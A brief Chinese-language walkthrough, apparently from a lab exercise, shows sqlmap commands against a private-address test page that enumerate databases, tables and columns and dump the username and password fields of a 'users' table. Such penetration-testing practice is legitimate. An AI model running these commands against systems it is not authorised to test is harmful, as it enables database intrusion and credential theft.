使用sqlmap爆库

1.检测是否可以注入

2.爆库

sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 –dbs

得到库名mysql performance_schema information_schema test

我们爆test数据库

3.爆表

sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 -D test –tables

成功得到表名

4.爆字段

sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 -D test -T users –columns

得到字段名

5.爆数据

sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 -D test -T users -C username,password –dump

通过字段得到数据。
